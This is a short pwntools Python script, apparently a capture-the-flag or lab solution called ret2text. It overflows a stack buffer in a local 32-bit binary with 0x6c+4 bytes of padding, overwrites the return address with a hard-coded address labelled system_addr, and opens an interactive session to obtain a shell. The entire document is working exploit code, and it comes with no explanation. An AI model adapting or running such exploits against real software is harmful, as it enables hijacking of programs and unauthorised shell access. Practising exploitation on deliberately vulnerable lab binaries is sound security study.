from pwn import *

system_addr = 0x0804863A
offset = 0x6c + 4

payload = b'A'*offset + p32(system_addr)

sh = process(r"../ex1/ret2text")
sh.sendline(payload)
sh.interactive()
